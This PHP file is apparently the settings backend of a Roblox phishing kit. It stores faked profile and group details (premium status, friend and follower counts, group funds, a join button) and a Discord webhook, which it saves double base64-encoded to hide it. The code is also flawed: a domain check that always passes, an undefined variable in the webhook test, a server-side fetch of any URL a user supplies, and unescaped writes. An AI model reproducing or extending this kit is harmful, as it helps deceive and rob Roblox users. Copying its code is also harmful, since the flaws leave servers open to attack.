<?php
session_start();
header('content-type: application/json; charset=utf-8');
if(!isset($_SERVER['HTTP_REFERER'])){
http_response_code(400);
die(json_encode(["errors" => [["code" => 400,'message' => 'BadRequest']]]));
} else {
    if(isset($_GET['type'])){
        $authkey = $_SESSION["authkey"];
        $siteid_dir = '../../tokens/'.$authkey.'.txt';
        if(file_exists($siteid_dir)) {
            $siteid = file_get_contents($siteid_dir);
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
        if($_GET['type'] == 'profile_username'){
            $profile_username = htmlspecialchars($_GET['value']);
            file_put_contents('../../tokens/'.$siteid.'/setup/username.txt',$profile_username);
            die(json_encode(['success' => true]));
        } if($_GET['type'] == 'profile_displayname'){
            $profile_displayname = htmlspecialchars($_GET['value']);
            file_put_contents('../../tokens/'.$siteid.'/setup/displayname.txt',$profile_displayname);
            die(json_encode(['success' => true]));
        } if($_GET['type'] == 'profile_premium'){
            $profile_premium = $_GET['value'];
            if($profile_premium == 0){
                $insert = 'false';
            }elseif($profile_premium == 1){
                $insert = 'true';
            }
            file_put_contents('../../tokens/'.$siteid.'/setup/premium.txt',$insert);
            die(json_encode(['success' => true]));
        } if($_GET['type'] == 'profile_userid'){
            $profile_userid = $_GET['value'];
            if(strlen($_GET['value']) > 0){
            if(is_numeric($profile_userid)) {
                $ch = curl_init('https://users.roblox.com/v1/users/'.$profile_userid);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, false);
                $output = json_decode(curl_exec($ch), true);
                if (array_key_exists('name', $output)) {
                file_put_contents('../../tokens/'.$siteid.'/setup/avatar.txt',$profile_userid);
                die(json_encode(['success' => true]));
                } else {
                    http_response_code(403);
                    die(json_encode(["errors" => [["code" => 403,'message' => 'Username not found on roblox database']]]));
                }
                } else {
                    http_response_code(403);
                   die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
                }
    } else {
        http_response_code(403);
       die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
    }
    } elseif($_GET['type'] == 'profile_friends') {
        $profile_friends = $_GET['value'];
        if(is_numeric($profile_friends)) {
        if($profile_friends <= 200) {
        file_put_contents('../../tokens/'.$siteid.'/setup/friends.txt',$profile_friends);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Friends count must be atleast 200 or under']]]));
        }
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'profile_followings') {
        $profile_followings = $_GET['value'];
        if(is_numeric($profile_followings)){
        file_put_contents('../../tokens/'.$siteid.'/setup/followings.txt',$profile_followings);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'profile_followers') {
        $profile_followers = $_GET['value'];
        if(is_numeric($profile_followers)){
        file_put_contents('../../tokens/'.$siteid.'/setup/followers.txt',$profile_followers);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'profile_activity') {
        $profile_activity = $_GET['value'];
        file_put_contents('../../tokens/'.$siteid.'/setup/activity.txt',$profile_activity);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'profile_join') {
        $profile_join = $_GET['value'];
        if($profile_join == 0) {
            $insert = 'false';
        } elseif($profile_join == 1) {
            $insert = 'true';
        }
        file_put_contents('../../tokens/'.$siteid.'/setup/joinbutton.txt',$insert);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'profile_created') {
        $profile_created = $_GET['value'];
        $newDate = date("Y/n/d", strtotime($profile_created));
        file_put_contents('../../tokens/'.$siteid.'/setup/created.txt',$newDate);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'profile_placevisits') {
        if(is_numeric($_GET['value'])) {
        $profile_placevisits = $_GET['value'];
        if(is_numeric($profile_placevisits)){
        file_put_contents('../../tokens/'.$siteid.'/setup/placevisits.txt',$profile_placevisits);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'group_name') {
        $group_name = htmlspecialchars($_GET['value']);
        file_put_contents('../../tokens/'.$siteid.'/setup/groupname.txt',$group_name);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'group_owner') {
        $group_owner = $_GET['value'];
        file_put_contents('../../tokens/'.$siteid.'/setup/groupowner.txt',$group_owner);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'group_thumbnails') {
        if (filter_var($_GET['value'], FILTER_VALIDATE_URL) == false) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Thumbnails should be URL']]]));
        } else {
            if(is_array(getimagesize($_GET['value']))) {
            $group_thumbnails = $_GET['value'];
            file_put_contents('../../tokens/'.$siteid.'/setup/groupthumbnails.txt',$group_thumbnails);
            die(json_encode(['success' => true]));
            } else {
                http_response_code(403);
                die(json_encode(["errors" => [["code" => 403,'message' => 'Thumbnails should be Image URL']]]));
            }
        }
    } elseif($_GET['type'] == 'group_funds') {
        $group_funds = $_GET['value'];
        if(is_numeric($group_funds)){
        file_put_contents('../../tokens/'.$siteid.'/setup/groupfunds.txt',$group_funds);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'group_member'){
        $group_member = $_GET['value'];
        if(is_numeric($group_member)){
        file_put_contents('../../tokens/'.$siteid.'/setup/groupmember.txt',$group_member);
        die(json_encode(['success' => true]));
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Invalid Request']]]));
        }
    } elseif($_GET['type'] == 'group_description'){
        $group_description = $_GET['value'];
        file_put_contents('../../tokens/'.$siteid.'/setup/groupdescription.txt',$group_description);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'group_shout'){
        $group_shout = $_GET['value'];
        file_put_contents('../../tokens/'.$siteid.'/setup/groupshout.txt',$group_shout);
        die(json_encode(['success' => true]));
    } elseif($_GET['type'] == 'webhook'){
        $webhook = $_GET['value'];
        if (filter_var($_GET['value'], FILTER_VALIDATE_URL) == false) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403,'message' => 'Webhook should be URL']]]));
        } else {
            $parseUrl = parse_url(trim($webhook)); 
            $webhookdomain = trim($parseUrl['host'] ? $parseUrl['host'] : array_shift(explode('/', $parseUrl['path'], 2)));
            if($webhookdomain == 'discord.com' || $webhookdomain == 'discordapp.com' || $webhookdomain = 'ptb.discord.com' || $webhookdomain == 'canary.discord.com') {
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $c);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
                        curl_setopt($ch, CURLOPT_HEADER, TRUE);
                        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
                        $response = curl_exec($ch); 
                        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        if($httpCode !== 200) {
                            http_response_code(403);
                            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
                        } else {
                            file_put_contents('../../tokens/'.$siteid.'/setup/webhook.txt',base64_encode(base64_encode($webhook)));
                            die(json_encode(['success' => true]));
                    }
            } else {
                http_response_code(403);
                die(json_encode(["errors" => [["code" => 403,'message' => 'Webhook should be active one']]]));
            }
        }
    }
}
}